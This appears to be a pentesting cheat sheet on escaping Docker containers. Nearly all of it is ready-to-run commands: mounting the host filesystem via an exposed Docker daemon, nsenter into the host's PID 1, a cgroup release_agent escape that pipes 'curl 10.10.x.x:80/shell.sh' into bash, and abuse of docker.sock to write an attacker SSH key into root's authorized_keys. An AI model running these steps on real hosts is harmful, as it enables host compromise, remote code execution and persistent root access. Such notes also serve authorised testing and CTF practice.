# Docker-Escape

Docker is an open-source containerization platform used for developing, deploying, and managing applications in lightweight virtualized environments called containers.

![OnPaste 20220611-182248](https://user-images.githubusercontent.com/106917304/173188805-30523d98-d755-4b94-8740-7a929aa28d6b.png)


# Exploitation

### Determining if we're in a container

1. Listing running processes
```markdown
ps aux
```
If there are few no. of process is running then you might be in docker.

2. Looking for .dockerenv
```markdown
cd / && ls -lah
```
If you see .dockerenv in base dir, then you're in a container.

3. Those pesky cgroups

Navigating to "/proc/1" and then catting  the "cgroups" file (cat cgroup).

4. Use following code to Verify you are in Docker
```markdown
if [ -f /.dockerenv ]; then
    echo "I'm inside matrix ;(";
else
    echo "I'm living in real world!";
fi
```


### Docker Escape Techniques

### Escape via Exposed Docker Daemon
Run the following cmnd

If we're in bash
```markdown
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

If we're in alpine
```markdown
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

You can see the images repo
```markdown
docker images
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
NOTE: ubuntu:18.04 is the image repo

### Shared Namespaces
By using ps aux you can view the process with processID see pid 1 is running root it is the first one that executed when the system is booted.

Exploiting it with nsenter
```markdown
nsenter --target 1 --mount sh
```

### Escape By Mounting File System
```markdown
lsblk
mount /dev/sda2 /mnt
cd /mnt/root
```
NOTE: In this case sda2 is the dir we mount.

### Misconfigured Privileges
list out all the capabilities
```markdown
capsh --print
capsh --print | grep sys_admin
```
If we get sys_admin capability, means the system is vuln.

On attacker VM.

First make a shell.sh and set python server and set listner.

On target machine.

```markdown
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.x.x:80/shell.sh | bash' >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```

### Exploitation of docker.sock in /var/run or /run if you're ROOT

Check /var/run dir for docker.sock file if it's there and you're root then you can exploit it. First see that you can use curl cmd if not then wget curl from your system for static curl see the arch of target machine and get the static curl from [Resource](https://github.com/moparisthebest/static-curl)


STEP1: Listing the images of the container of the host
```markdown
./curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

STEP2: Now generate id_rsa in your machine
```markdown
ssh-keygen -t rsa
cat key.pub
```

STEP3: Creating a new docker container with image ID
```markdown
./curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"c3:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxfoS+Yb2cW4y9cKcBWpVIiNiBXKSWMtxjY0IqeRbjwheXw5MEtMX7sIB/0cKl8W/mY4u1UeRzWOoIIew6hqlaWCW6WKeSiCrNzEEj8GMQ6/0mvqmNpc001DpNeVLCKFR9S8W8kcR7V8xzJVCqatscFjAPR3CUlOwHiLZP8h0uQNUSlkCyVY+kHgN9bHvY7t5EicqchWod5Kkjim6PR7/cEJHzxdx1FH9X08u5NQ5tCNMCt298sPba2xkWtknLYZRx0TQZWWedDk2mC0wJph2fv/Jjn1BsMtOpjH/s/mfVg28BXR3PJbJMHxFLEofonMjbeSUy0zSzOAJ0ePPVVaxGj8tydpwX3En/bgdWbnH29/eleIlUY9MhHNTRY5PDcra3emTX0nktoseZ2nazqXJYbsZ5vojcXbWA8B4f3SjESHZ8fGDWxL2+ZV+e0cliIo6GPNtPi/ZD/66vrztzP3eEW8mGP0771inrHoHXgQP0/BMcKBS2pzqct2rTQ/LfFFM= root@kali >> /var/tmp/root/.ssh/authorized_keys"]}'
```

NOTE: replace "c3:latest" with the docker image name that you'll get from step1. eg: "RepoTags":["c3:latest"]

Now you'll see you created a docker and get the id. eg: {"Id":"c19a25c6cc7245030bf9741d300f632cc7f1e5f12adad238edce23d387ba00c2","Warnings":[]}


STEP4: Now we gonna use the id and start the docker
```markdown
./curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http://localhost/containers/c19a25c6cc7245030bf9741d300f632cc7f1e5f12adad238edce23d387ba00c2/start
```


STEP5: Login SSH via your private key as user root and now you're root
```markdown
ssh -i key root@10.10.x.x
```

